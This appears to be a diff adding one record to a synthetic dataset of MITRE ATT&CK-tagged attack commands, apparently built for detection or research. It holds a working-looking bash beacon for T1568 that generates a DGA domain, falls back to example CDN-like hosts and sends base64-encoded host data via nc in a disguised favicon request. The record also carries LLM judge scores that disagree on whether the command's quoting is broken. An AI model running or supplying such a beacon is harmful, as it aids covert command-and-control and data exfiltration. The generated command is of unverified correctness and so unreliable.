@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "bash",
+  "command": "bash -c \"seed='news'$(date -u +%Y%m%d)$(hostname); sha=$(printf '%s' \"$seed\" | sha1sum | cut -d' ' -f1); d=\\\"${sha:0:12}.com\\\"; host=''; ip=''; for h in \\\"$d\\\" cdn-update.example.net img-cdn.example.org; do ip=$(dig +short \\\"$h\\\" | shuf -n1); if [ -n \\\"$ip\\\" ]; then host=\\\"$h\\\"; break; fi; done; ua=\\\"Mozilla/5.0 (X11; Linux x86_64)\\\"; beacon=$(printf 'id=%s&ts=%s' \\\"$(id -u)\\\" \\\"$(date -u +%s)\\\" | base64 -w0); printf 'GET /favicon.ico?b=%s HTTP/1.1\\r\\nHost: %s\\r\\nUser-Agent: %s\\r\\nConnection: close\\r\\n\\r\\n' \\\"$beacon\\\" \\\"$host\\\" \\\"$ua\\\" | nc -w 5 \\\"$ip\\\" 80\"",
+  "explanation": "Generates a DGA-based domain from the current date and hostname, resolves it at runtime, falls back to CDN-like domains, and sends a base64 beacon via an HTTP GET to a common resource to blend with normal traffic.",
+  "rationale_steps": [
+    "Derive a DGA domain using SHA1(seed(date,hostname)) to enable dynamic resolution.",
+    "Resolve domain with dig and select a live IP; fallback to alternative CDN-like domains.",
+    "Construct a benign-looking HTTP GET to /favicon.ico with common headers.",
+    "Embed base64-encoded beacon in query and send over TCP via nc."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-213026ff-f38c4b79",
+  "source_prompt_hash": "213026ff",
+  "timestamp_utc": "2025-09-30T03:23:47.812011Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 2,
+        "syntactic_justification": "The outer bash -c string is broken by the unescaped inner double quotes around \"$seed\", causing premature string termination despite otherwise balanced constructs and valid flags.",
+        "semantic_score": 3,
+        "semantic_justification": "It conceptually performs DGA-based domain generation, runtime DNS resolution with fallback, and an HTTP beacon (aligned with T1568), but the reliance on example domains and the quoting bug make successful execution and endpoint reachability unlikely.",
+        "combined_score": 2.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T05:38:43.470844Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 4,
+        "syntactic_justification": "The command is largely well-formed with proper quoting, semicolons, and pipe usage, though the nested variable expansion and mixed quoting within the outer bash -c string creates edge cases where quote escaping could fail depending on the shell invocation context.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements T1568 by generating a DGA domain seeded with date and hostname via SHA1, resolving it at runtime with fallback to CDN-mimicking domains, randomizing IP selection, and sending a base64-encoded beacon disguised as a favicon request with a legitimate-looking User-Agent to blend with normal HTTP traffic.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2026-02-19T00:20:04.070537Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using correctly escaped double quotes within the bash -c string, balanced subshells, and valid tool flags.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements a DGA by seeding a hash with the date and hostname, resolves it dynamically, and constructs a realistic HTTP beacon, aligning perfectly with T1568.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2026-02-19T00:20:06.840823Z"
+      }
+    ],
+    "llm_average_syntactic": 3.667,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.0,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
